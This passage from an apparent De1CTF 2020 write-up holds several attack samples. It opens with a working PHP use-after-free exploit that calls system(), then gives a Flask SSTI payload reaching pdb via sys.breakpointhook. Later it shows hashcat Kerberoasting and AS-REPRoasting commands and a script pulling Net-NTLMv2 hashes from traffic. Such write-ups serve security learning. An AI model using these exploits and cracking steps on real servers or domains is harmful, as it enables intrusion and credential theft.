<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> $backtrace;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span> -&gt; a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>) -&gt; getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2int</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">4</span>]);</span><br><span class="line">        $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">5</span>]);</span><br><span class="line">        $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">6</span>]);</span><br><span class="line">        $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $address |= ord($str[<span class="number">7</span>]);</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($offset)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc;</span><br><span class="line">        <span class="keyword">return</span> strrev(substr($abc, $offset, <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leakA</span><span class="params">($offset)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $helper;</span><br><span class="line">        <span class="keyword">return</span> strrev(substr($helper -&gt; a, $offset, <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($offset, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc;</span><br><span class="line">        $abc[$offset] = $data[<span class="number">7</span>];</span><br><span class="line">        $abc[$offset + <span class="number">1</span>] = $data[<span class="number">6</span>];</span><br><span class="line">        $abc[$offset + <span class="number">2</span>] = $data[<span class="number">5</span>];</span><br><span class="line">        $abc[$offset + <span class="number">3</span>] = $data[<span class="number">4</span>];</span><br><span class="line">        $abc[$offset + <span class="number">4</span>] = $data[<span class="number">3</span>];</span><br><span class="line">        $abc[$offset + <span class="number">5</span>] = $data[<span class="number">2</span>];</span><br><span class="line">        $abc[$offset + <span class="number">6</span>] = $data[<span class="number">1</span>];</span><br><span class="line">        $abc[$offset + <span class="number">7</span>] = $data[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line">        $arg = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln -&gt; a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># UAF</span></span><br><span class="line">    trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper -&gt; b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line">    <span class="comment"># leak head point of next php heap</span></span><br><span class="line">    $php_heap = leak(<span class="number">0x88</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"PHP Heap: "</span> . bin2hex($php_heap) . <span class="string">"\n"</span>;</span><br><span class="line">    $abc_address = str2int($php_heap) - <span class="number">0x88</span> - <span class="number">0xa0</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'$abc: '</span> . dechex($abc_address) . <span class="string">"\n"</span>;</span><br><span class="line">    $closure_object = leak(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Closure Object: "</span> . bin2hex($closure_object) . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment"># let a point to closure_object</span></span><br><span class="line">    write(<span class="number">0x10</span>, substr($php_heap, <span class="number">0</span>, <span class="number">4</span>) . hex2bin(dechex(str2int($closure_object) - <span class="number">0x28</span>)));</span><br><span class="line">    write(<span class="number">0x18</span>, str_pad(<span class="string">"\x06"</span>, <span class="number">8</span>, <span class="string">"\x00"</span>, STR_PAD_LEFT));</span><br><span class="line">    <span class="comment"># leak Closure Handlers</span></span><br><span class="line">    $closure_handlers = leakA(<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Closure Handlers: "</span> . bin2hex($closure_handlers) . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment"># compute system address</span></span><br><span class="line">    $system_address = dechex(str2int($closure_handlers) - <span class="number">10733946</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"System: "</span> . $system_address . <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment"># build fake closure_object</span></span><br><span class="line">    write(<span class="number">0x90</span>, leakA(<span class="number">0x10</span>));</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x08</span>, leakA(<span class="number">0x18</span>));</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x10</span>, leakA(<span class="number">0x20</span>));</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x18</span>, leakA(<span class="number">0x28</span>));</span><br><span class="line">    $abc[<span class="number">0x90</span> + <span class="number">0x38</span>] = <span class="string">"\x01"</span>;</span><br><span class="line">    write(<span class="number">0x90</span> + <span class="number">0x68</span>, substr($php_heap, <span class="number">0</span>, <span class="number">4</span>) . hex2bin($system_address));</span><br><span class="line">    <span class="comment"># let b get this object</span></span><br><span class="line">    write(<span class="number">0x20</span>, substr($php_heap, <span class="number">0</span>, <span class="number">4</span>) . hex2bin(dechex(str2int($php_heap) + <span class="number">0x08</span> - <span class="number">0xa0</span>)));</span><br><span class="line">    <span class="comment"># eval system</span></span><br><span class="line">    ($helper -&gt; b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="mc_logclient">mc_logclient</span></h2>
<p>Files: <a href="https://pastebin.com/qZxVNaqm" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a></p>
<p>It's a <code>minecraft log web client</code>.</p>
<p>The <code>chatting content</code> of players are stored in <code>logs/</code> with their's UUID. The <code>logs/</code> is mounted as read-only directory.</p>
<p>A simple <code>SSTI</code> with <code>render_template_string</code> of <code>flask</code>. Almost words are blacklisted. After <code>python 3.7</code>, there is a new function <code>sys.breakpointhook()</code>, using it to run arbitrary code.</p>
<p>First, saying <code>payload</code> showed below in the chat box of minecraft. (Message with a '/' prefix to act as a command, for hiding your <code>payload</code> from other players)</p>
<p>The environment is <code>python 3.8</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&#123;&#123;[].__class__.__base__.__subclasses__()[133].__init__.__globals__[&apos;sys&apos;][&apos;breakpointhook&apos;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>Then, triggle <code>render_template_string</code> by visiting <code>/read?work={work}&amp;filename={uuid}</code>.</p>
<p>You have 30 seconds to access <code>/write</code> for writing the <code>command</code> to <code>pdb</code>.</p>
<p>More details, have a check on exploit file <code>exp.go</code>.</p>
<p><code>De1CTF{MC_L0g_C1ieNt-t0-S1mPl3_S2Tl~}</code></p>
<h1><span id="misc">misc</span></h1>
<h2><span id="mc_easybgm">mc_easybgm</span></h2>
<p>Files: <a href="https://pastebin.com/8EeQ8YCz" target="_blank" rel="noopener">mp3.py</a></p>
<p>Unused bit stego. The script: <code>mp3.py</code>.</p>
<p><a href="https://en.wikipedia.org/wiki/MP3#File_structure" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/MP3#File_structure</a></p>
<p><code>De1CTF{W31c0m3_t0_Mi73CR4Ft_W0r1D_D3jAVu!}</code></p>
<h2><span id="mc_joinin">mc_joinin</span></h2>
<p>Files: <a href="https://pastebin.com/Ez5khLu5" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a></p>
<p>The minecraft game service is opened on default port <code>25565</code>.</p>
<p>We add the server to mutil-player server list. It seems that it's not supported by our client. The server is using 'MC2020' as service and our client is seems to be outdated.</p>
<p><img src="https://i.loli.net/2020/05/05/riEdb1Cu59RZcJT.png"></p>
<p>From the website we know that, <code>MC2020</code> is developed based on <code>1.12</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Minecraft 20.20 is developed by De1ta Team based on 1.12</span><br></pre></td></tr></table></figure>
<p>Of course there is a thick. The server is still using <code>1.12</code> protocol to communicate. But in the 'protocol version checking' procedure, it's just failed.</p>
<p>It comes out two solutions. One, we just simply replace the 'version' in the procedure during communication between the server and the client by a custom proxy. Another, we simulate the client's function, login to the game.</p>
<p>Reference:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Minecraft 1.12 Protocol(Version: 335) Wiki Page</span><br><span class="line">https://wiki.vg/index.php?title=Protocol&amp;oldid=13223</span><br></pre></td></tr></table></figure>
<p><code>exp.go</code> is the exploit written in golang, containing with two solutions mentioned above.</p>
<p>The flag is hidden in the image from <code>imgur</code>.</p>
<p><img src="https://i.loli.net/2020/05/05/S72oQOWhYrAcBa6.png"></p>
<p><code>De1CTF{MC2020_Pr0to3l_Is_Funny-ISn't_It?}</code></p>
<h2><span id="mc_champion">mc_champion</span></h2>
<p>Files: <a href="https://pastebin.com/964gxEzg" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a></p>
<p>The Minecraft game is modified basing on <a href="https://github.com/TyphoonMC/TyphoonLimbo" target="_blank" rel="noopener">TyphoonMC/TyphoonLimbo</a>.</p>
<p>When you login to the game, you are in the Limbo World. Nothing you can do except chatting with other players. After fuzzing, it's not difficult to find out the <code>/help</code> command.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[ADMIN]</span><br><span class="line">/help -&gt; show the usage</span><br><span class="line">/uuid -&gt; show your uuid</span><br><span class="line">/status -&gt; show your status</span><br><span class="line">/items -&gt; show your items</span><br><span class="line">/exchange -&gt; make some exchange</span><br><span class="line">/shop -&gt; list all category</span><br><span class="line">/shop [category_id] -&gt; list items in category</span><br><span class="line">/buy [item_id] -&gt; buy the item</span><br><span class="line">/use [item_id] -&gt; use your item</span><br><span class="line">/attack -&gt; attack the BOSS</span><br></pre></td></tr></table></figure>
<p>Player's items are stored in a golang slice. Each item has five attributes listed below. After a fuzzing, you may figure it out.</p>
<blockquote>
<p>Price / Attack / Shield / HP / Food / XP</p>
</blockquote>
<p>The vulnerable function is located in <code>exhcange</code> -&gt; <code>random sell</code>. It triggles a <code>pop from slice</code> liked function which return result in bad sequence caused wrong item pop out.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">func slicePop(s []int, i uint) (r []int, e int) &#123;</span><br><span class="line">    if len(s) == 0 &#123;</span><br><span class="line">        return []int&#123;&#125;, -1</span><br><span class="line">    &#125;else if len(s) == 1 &#123;</span><br><span class="line">        return []int&#123;&#125;, s[0]</span><br><span class="line">    &#125;</span><br><span class="line">    if i &gt;= uint(len(s)) &#123;</span><br><span class="line">        return s[1:], s[0]</span><br><span class="line">    &#125;</span><br><span class="line">    return append(s[:i], s[i + 1:]...), s[i]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Our goal is earning enough money (more than $200) and using a TNT to defeat the boss.</p>
<p>Want more details? Have a look on the exploit <code>exp.go</code> written in golang.</p>
<p>After won the game, we got the <code>Encoded Message</code>. Simply have a <code>Base32 Decode</code> and a <code>rot13</code>. We got Flag Two of this challenge and a hidden command <code>/MC2020-DEBUG-VIEW:-)</code>. Next challenge, we will use this command.</p>
<p><code>De1CTF{S3cur3_UsAG3_0f-GO_Slice~}</code></p>
<h2><span id="life">Life</span></h2>
<p>No Game No Life!</p>
<figure>
<img src="https://i.loli.net/2020/05/06/BWRS5XzCgJfqh9o.jpg" alt><figcaption>87821588769450_.pic_hd.jpg</figcaption>
</figure>
<h3><span id="hints">Hints</span></h3>
<ol type="1">
<li>Game of Life.</li>
</ol>
<h3><span id="flag">Flag</span></h3>
<p>De1CTF{l3t_us_s7art_th3_g4m3!}</p>
<h3><span id="solution">Solution</span></h3>
<ol type="1">
<li>Separate zip from jpg;</li>
<li>There is a monochrome in the zip file, and another encrypted zip;</li>
<li>Use the monochrome as the input to the Conway life game for the first round, you will get a qrcode, scan and you the get the password for the zip;</li>
<li>Unzip, and you will get a plain text file</li>
<li>Reverse the text in the pilf.txt, base64 decode , reverse, HEX to ASCII and you will get the flag</li>
</ol>
<h3><span id="note">Note</span></h3>
<p>The main problem of this game is hard to froge the data to the Conway Life Game. And I presume that machine learning maybe helpful</p>
<p>So Conway Life game will be the trap for player.</p>
<h2><span id="easy-protocol">Easy Protocol</span></h2>
<h3><span id="hint">hint</span></h3>
<p>The file header of hint is 'MSCF'. After searching by google, we can see that this is a makecab compressed file. Use the expand command to extract hint.txt directly.</p>
<p>hint.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hint1: flag is De1CTF&#123;part1_part2_part3&#125;</span><br><span class="line">hint2: The part1,part2 and part3 is a pure number with a length of 8</span><br><span class="line"></span><br><span class="line">have fun!!!!!</span><br></pre></td></tr></table></figure>
<p>hint.txt should be related to the traffic packet, just ignore it for now</p>
<h3><span id="part1">part1</span></h3>
<p>Take a look at the traffic packets, and mainly focus on the Kerberos protocol and the LDAP protocol. Simply follow the LDAP and find that the filtering conditions are: <code>(&amp;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*))(samAccountName=De1CTF2020))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))</code>Mainly this <code>servicePrincipalName=*</code>, querying all existing SPNs of domain user 'de1ctf2020'</p>
<figure>
<img src="https://i.loli.net/2020/05/05/98zZt3wkNfog7Hi.png" alt><figcaption>9.png</figcaption>
</figure>
<p>Then there is a tgs-req request</p>
<figure>
<img src="https://i.loli.net/2020/05/05/raVzWJtOveiPslk.png" alt><figcaption>10.png</figcaption>
</figure>
<p>Back to hint, it's supposed to be a brute force attack or something, and then guess <code>kerberosting</code></p>
<p>Then extract the SPN in TGS-REQ and the <code>enc-part</code> of the ticket</p>
<figure>
<img src="https://i.loli.net/2020/05/05/boYP7hWDpjUnzQV.png" alt><figcaption>8.png</figcaption>
</figure>
<p>Constructed into a hash format supported by hashcat, <code>$krb5tgs$23$*&lt;USERNAME&gt;$&lt;DOMAIN&gt;$&lt;SPN&gt;*$&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p>
<p>Then brute force</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 13100 $krb5tgs$23$*De1CTF2020$test.local$part1/De1CTF2020*$b9bac2cd9555738bc4f8a38b7aa3b01d$12befde687b62d10d325ebc03e0dd0d6bca1f526240dfa6d23dc5bcafc224591dcf4ba97bf6219cfbe16f1b59d289800fdcc8f051626b7fe0c2343d860087c45b68d329fd1107cebe4e537f77f9eea0834ae8018a4fe8518f1c69be95667fd69dcc590d3d443a8530ff8e38ee7f7b6e378d64a8b43b985bcc20f941947ea9e8463fd7e0fa77f284368b9b489f6d557da1e02990cfc725723e5d452ff6e659717947805b852ad734c5acc8011e535b96cef3af796610196d31c725362f7426e0cf92985ffe0717baaf5066fdba760b90e2c9b7e15bc9a4952cff47d4a092d3be6128997f9ff85dbafb85a5569b5d021b2a23c6371cbdf8beaa68b332e6ba1c1a8dc43c50695498ed8c2dfbf11760af35e1b913cd36b8015df37a146d2696c8b6b5f2ce375f2674acc0ce04aa98b9d21291466ce7a2aeb5a72fda17fa53e5b41df67d3898457d05fc899096092b3aa5bc333cb75eb5eee4b1c33356e72d9d28d6d674a5e47f64c72afb580e8d4f713a5ae265a4c825c39c19313a532a23c27eaf24bcde29c5e65c13cc057e0db72094bcedb6049574e35e511847f460180ddd78f4c9187345b1068bd608ca238c20d200ffa7e3891d076fe6fcef93d044c79f5ec9fb33561a35acf785b2a203df6d07e39161d9d3cedbe6d4394bd2bf43e545acd03f796c7863d684f9db4a5eef070f71e58a4882c2387d0705f4bed32fd7986dd672a15f6cfa56fe127af7c157216b2ea4f61ab7963d9dcaf4bb9222a7cba86d6a5e6c24833ffbf1957d90224764a01e0cb5a90f12dfea4ddaef23e30c2bdafcbcd99031db5d0698c1a050fc679213a8b81b854c08686f43241a4ec937c71cd09c9519fa2bba3aa845c4e84dbd6d9bbc3a62c876fb4c30bfa7960f0f51587ece14a31add698b1b9743e14fc343394f8a346c8e24cc8c26a8f8246f6a68928d0118dea81fea9976af3c57fa4c764f565e458e065d5a2a3dd1b083f7851d4ae1b791ada853e9a20e5b169ea0b8b582711f04df4dad8b461771dda5fca11c3f8f82d85e657bbd57d12cf15c8bbce7ad6cd1ebf540c45aefd4aef2ec828b06f208bd57be6a5529481b9f8b8fad5962e86b349a720ec2a1380ed711ee0261b29383907dae6f7a45d3fff54efae7ace1f4d7193f4a4d932699a41c3deb3ba9934278942e8f09ecd4339de4059dd3ff06b78e773b6ab9826df7ea2a443dddd55cdf79db1f76e2f05105e6cc5f0c4bd494b9556d921c6cb3fa48d1ddd27cf077ebd3e44b716fc74d1115b293e348fb9676e6727a3a97a7c2b86e8b83d8f90b9bf628c71e56aabcac381a32d493db3f255378c498a0bf527a9677cb81ec89911a9b09d6ffe16e2f2de63728439f8275d9f6feac2da860c5aab772034b2b0b962c033f8102ac86b2a9b07a82e9c70be65fe371e9d296afbe0e7272b90256428553c6a4fb0a8f5290098e4dad4021d99a65f2a3fa4ad0d2f ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></table></figure>
<p>Get Part1: 79345612</p>
<h3><span id="part2">part2</span></h3>
<p>This is actually the process of <code>AS-REPRoasting</code>. The judgment process is as follows</p>
<p>Follow up the LDAP query request and found that there is such a filter condition: <code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/dpPUTgXieY9AGIw.png" alt><figcaption>4.png</figcaption>
</figure>
<figure>
<img src="https://i.loli.net/2020/05/05/IZRjrLFk8Eldpac.png" alt><figcaption>5.png</figcaption>
</figure>
<p>The value of <code>DONT_REQ_PREAUTH</code> is<code>4194304</code>, In other words, this LDAP request is to find the user who has enabled <code>Do not require Kerberos preauthentication</code>, If the user has turned on <code>Do not require Kerberos preauthentication</code>, then he can brute force the user's credentials through<code>AS-REPRoasting</code>.</p>
<p>There is another way to judge is that when the AS-REQ request is sent in the first step, AS-REP returned an <code>eRR-PROAUTH-REQUIRED</code> error, but this method cannot completely determine that it is<code>AS-REPRoasting</code>, because in the default case, the <code>Windows Kerberos</code> client does not include pre-authentication information in the first request, so this situation also occurs during normal authentication. <code>eRR-PROAUTH-REQUIRED</code> is just to further verify our guess of<code>AS-REPRoasting</code> above</p>
<figure>
<img src="https://i.loli.net/2020/05/05/6jbiXVxd1gYsFMI.png" alt><figcaption>6.png</figcaption>
</figure>
<p>Guess it is after the AS-REPRoasting process, and then extract the <code>enc-part</code> part of the ticket from the AS-REP</p>
<figure>
<img src="https://i.loli.net/2020/05/05/XzlLOxdZofhqIE2.png" alt><figcaption>7.png</figcaption>
</figure>
<p>Constructed into a hash format supported by hashcat, <code>$krb5asrep$23$&lt;PRINCIPAL_NAME&gt;:&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p>
<p>Then brute force</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 18200 $krb5asrep$23$De1CTF2020@test.local:2a00ca98642914e2cebb2718e79cbfb6$9026dd00f0b130fd4c4fd71a80817ddd5aec619a9b2e9b53ae2309bde0a9796ebcfa90558e8aaa6f39350b8f6de3a815a7b62ec0c154fe5e2802070146068dc9db1dc981fb355c94ead296cdaefc9c786ce589b43b25fb5b7ddad819db2edecd573342eaa029441ddfdb26765ce01ff719917ba3d0e7ce71a0fae38f91d17cf26d139b377ea2eb5114a2d36a5f27983e8c4cb599d9a4a5ae31a24db701d0734c79b1d323fcf0fe574e8dcca5347a6fb98b7fc2e63ccb125a48a44d4158de940b4fd0c74c7436198380c03170835d4934965ef6a25299e3f1af107c2154f40598db8600c855b2b183 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></table></figure>
<p>get part2:74212345</p>
<h3><span id="part3">part3</span></h3>
<p>This is an NTLM authentication process. You can extract the <code>Net-NTLM v2 hash</code> in the traffic packet. There are two methods. The first method is to extract the content of the<code>WWW-Authenticate</code> header. The second One method is to extract the various parts of the <code>Net-NTLM v2 hash</code> directly from the traffic packet.</p>
<p>Take the first method as an example here, extract the contents of the <code>WWW-Authenticate</code> header, and write a script to convert it into<code>Net-NTLM v2 hash</code></p>
<p>Reference：<a href="https://www.innovation.ch/personal/ronald/ntlm.html" target="_blank" rel="noopener">https://www.innovation.ch/personal/ronald/ntlm.html</a></p>
<p>python script</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NTLM=<span class="string">"NTLM TlRMTVNTUAADAAAAGAAYAH4AAAAkASQBlgAAAAgACABYAAAAFAAUAGAAAAAKAAoAdAAAAAAAAAC6AQAABYKIogoAY0UAAAAPZ+qOBf/ZoMFgp+YUgxdqNVQARQBTAFQARABlADEAQwBUAEYAMgAwADIAMABXAEkATgAxADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtZkcwqDVhdD4EzWOqvx0EgEBAAAAAAAAEwy5ECMI1gHSKQvAwlYXqAAAAAACAAgAVABFAFMAVAABAAwARABNADIAMAAxADIABAAUAHQAZQBzAHQALgBsAG8AYwBhAGwAAwAiAGQAbQAyADAAMQAyAC4AdABlAHMAdAAuAGwAbwBjAGEAbAAFABQAdABlAHMAdAAuAGwAbwBjAGEAbAAHAAgAEwy5ECMI1gEGAAQAAgAAAAgAMAAwAAAAAAAAAAAAAAAAEAAA7Ko9RN3EZAJsRTIGgTqvoLkY8q1D1Jfvj7a+sggyWKQKABAAAAAAAAAAAAAAAAAAAAAAAAkAHgBIAFQAVABQAC8AdABlAHMAdAAuAGwAbwBjAGEAbAAAAAAAAAAAAA=="</span></span><br><span class="line">b64_challenge=<span class="string">"NTLM TlRMTVNTUAACAAAACAAIADgAAAAFgomiVohvkPy3Pe0AAAAAAAAAAIIAggBAAAAABgOAJQAAAA9UAEUAUwBUAAIACABUAEUAUwBUAAEADABEAE0AMgAwADEAMgAEABQAdABlAHMAdAAuAGwAbwBjAGEAbAADACIAZABtADIAMAAxADIALgB0AGUAcwB0AC4AbABvAGMAYQBsAAUAFAB0AGUAcwB0AC4AbABvAGMAYQBsAAcACAATDLkQIwjWAQAAAAA="</span></span><br><span class="line">challenge= b64_challenge[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)[<span class="number">24</span>:<span class="number">24</span>+<span class="number">8</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">message = NTLM[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg2str</span><span class="params">(msg,start,uni=True)</span>:</span></span><br><span class="line">    len = ord(msg[start+<span class="number">1</span>])*<span class="number">256</span> + ord(msg[start])</span><br><span class="line">    offset = ord(msg[start+<span class="number">5</span>])*<span class="number">256</span> + ord(msg[start+<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">if</span> uni:</span><br><span class="line">        <span class="keyword">return</span> (msg[offset:offset+len]).replace(<span class="string">"\x00"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> msg[offset:offset+len]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user = msg2str(message,<span class="number">36</span>)</span><br><span class="line">domain = msg2str(message,<span class="number">28</span>)</span><br><span class="line">response = msg2str(message,<span class="number">20</span>,<span class="keyword">False</span>)</span><br><span class="line">NTProofStr = response[<span class="number">0</span>:<span class="number">16</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">blob = response[<span class="number">16</span>:].encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&#123;user&#125;::&#123;domain&#125;:&#123;challenge&#125;:&#123;NTProofStr&#125;:&#123;blob&#125;"</span>.format(user=user,domain=domain,challenge=challenge,NTProofStr=NTProofStr,blob=blob))</span><br></pre></td></tr></table></figure>
<p>get <code>Net-NTLM v2 hash</code></p>
